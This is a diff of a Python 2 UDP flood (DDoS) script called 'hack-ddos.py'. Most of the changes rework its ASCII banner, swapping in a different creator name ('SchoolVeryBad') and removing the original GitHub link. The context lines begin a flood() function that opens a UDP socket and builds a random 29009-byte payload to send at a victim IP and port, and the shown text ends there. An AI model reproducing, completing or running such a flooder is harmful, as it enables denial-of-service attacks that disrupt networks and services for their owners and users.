@@ -1,24 +1,24 @@
-
+#ddos
 import time
 import socket
 import random
 import sys
 def usage():
     print "\033[1;32m#########################################################"
-    print "#------------------------[\033[1;91mWifi-ddos CREATER https://github/schoolverybad\033[1;32m]---------------------#"
+    print "#------------------------[\033[1;91mwifi-ddos\033[1;32m]---------------------#"
     print "#-------------------------------------------------------#"
-    print "#   \033[1;91mCommand: " "python2 wifi-ddos " "<ip> <port> <packet> \033[1;32m   #"
+    print "#   \033[1;91mCommand: " "python2 hack-ddos.py " "<ip> <port> <packet> \033[1;32m   #"
     print "#                                                       #"
-    print "#\033[1;91mCreator:artem-cell  \033[1;32m##      ###       ##                #"
+    print "#\033[1;91mCreator: SchoolVeryBad  \033[1;32m##      ###       ##                #"
     print "#\033[1;91mTeam   : ISL        \033[1;32m##     #          ##                #"
     print "#\033[1;91mVersion:1.0        \033[1;32m##      ###       ##                #"
     print "#                   ## \033[1;91m ##     \033[1;32m#  \033[1;91m##  \033[1;32m##                #"
     print "#                   ##  \033[1;91m##  \033[1;32m###   \033[1;91m##  \033[1;32m######            #"
     print "#               \033[1;91m<--[ISL]-->         \033[1;32m#"
     print "#########################################################"
-    print "                        @@@@@@@@@@@@@
-    print "                       @@@@@@e.e@@@@@@
-    print "                     @@@@@@@@@@@@@@@@@@
+    print "                        @@@@@@@@@@"
+    print "                       @@@@@@@@@@@@"
+    print "                     @@@@@@@@@@@@@@@@"
 def flood(victim, vport, duration):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     bytes = random._urandom(29009)
